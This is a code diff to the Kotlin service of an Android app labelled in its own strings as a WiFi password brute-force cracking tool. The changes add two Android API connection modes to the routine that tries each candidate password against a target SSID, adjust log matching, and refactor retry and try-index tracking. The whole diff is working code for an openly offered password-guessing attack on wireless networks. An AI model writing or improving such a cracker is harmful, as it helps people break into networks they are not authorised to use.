@@ -9,6 +9,7 @@ import androidx.core.app.NotificationCompat
 import com.wifi.toolbox.*
 import com.wifi.toolbox.structs.*
 import com.wifi.toolbox.ui.MainActivity
+import com.wifi.toolbox.utils.ApiUtil
 import com.wifi.toolbox.utils.ShizukuUtil
 import kotlinx.coroutines.*
 import kotlin.coroutines.resume
@@ -61,10 +62,12 @@ class PojieService : Service() {
 
     private suspend fun performTaskLogic(app: MyApplication, task: SinglePojieTask): Int {
         val startTime = System.currentTimeMillis()
-
-        when (pojieSettings.connectMode) {
+        val connectMode = pojieSettings.connectMode
+        when (connectMode) {
             0 -> throw Exception("连接wifi实现为空，请先去设置中选择")
             1 -> ShizukuUtil.connectToWifi(task.ssid, task.password)
+            2 -> if(!ApiUtil.connectToWifiApi28(this, task.ssid, task.password))throw Exception("请求发送失败，请先忘记此网络")
+            3 -> ApiUtil.connectToWifiApi29(this, task.ssid, task.password)
             else -> throw Exception("前面的区域，以后再来探索吧(connectMode=${pojieSettings.connectMode})")
         }
 
@@ -74,7 +77,10 @@ class PojieService : Service() {
                     when (readLogMode) {
                         1 -> logcatService?.logFlow?.collect { data ->
                             if (continuation.isActive) {
-                                if (data.ssid == task.ssid && data.eventStartTime >= startTime) {
+                                if (connectMode == 3 || //看起来WifiNetworkSpecifier好像没有开始的日志
+                                    data.ssid == task.ssid
+                                    && data.eventStartTime >= startTime
+                                ) {
 
                                     when (data.event) {
                                         WifiLogData.EVENT_WIFI_CONNECTED -> {
@@ -270,8 +276,12 @@ wifi密码暴力破解工具 v3 for Android
                 currentWorkingSsid = task.ssid
                 val currentPass = task.tryList.getOrNull(task.tryIndex) ?: "未知"
 
-                task.textTip = "正在尝试：$currentPass"
-                task.lastTryTime = System.currentTimeMillis()
+                app.updateTaskState(task.ssid) {
+                    it.copy(
+                        textTip = "正在尝试：$currentPass",
+                        lastTryTime = System.currentTimeMillis()
+                    )
+                }
 
                 var taskResult = -1
 
@@ -310,7 +320,7 @@ wifi密码暴力破解工具 v3 for Android
 
                     SinglePojieTask.RESULT_FAILED -> {
                         processTaskCompletion(app, task.ssid)
-                        task.retryCount = 0
+                        app.updateTaskState(task.ssid) { it.copy(retryCount = 0) }
                     }
 
                     SinglePojieTask.RESULT_ERROR -> {
@@ -318,11 +328,11 @@ wifi密码暴力破解工具 v3 for Android
                     }
 
                     SinglePojieTask.RESULT_TIMEOUT, SinglePojieTask.RESULT_ERROR_TRANSIENT -> {
-                        task.retryCount++
-                        if (app.pojieConfig.retryCountType <= 5 && task.retryCount > app.pojieConfig.retryCountType) {
-                            //放行，直接下一个
+                        app.updateTaskState(task.ssid) { it.copy(retryCount = it.retryCount + 1) }
+                        val updatedTask = getTask(app, task.ssid)
+                        if (updatedTask != null && app.pojieConfig.retryCountType <= 5 && updatedTask.retryCount > app.pojieConfig.retryCountType) {
+                            app.updateTaskState(task.ssid) { it.copy(retryCount = 0) }
                             processTaskCompletion(app, task.ssid)
-                            task.retryCount = 0
                         }
                     }
                 }
@@ -344,8 +354,12 @@ wifi密码暴力破解工具 v3 for Android
         if (nextIndex >= task.tryList.size) {
             app.stopTaskByName(ssid)
         } else {
-            task.tryIndex = nextIndex
-            task.textTip = "排队中"
+            app.updateTaskState(ssid) {
+                it.copy(
+                    tryIndex = nextIndex,
+                    textTip = "排队中"
+                )
+            }
         }
     }
 
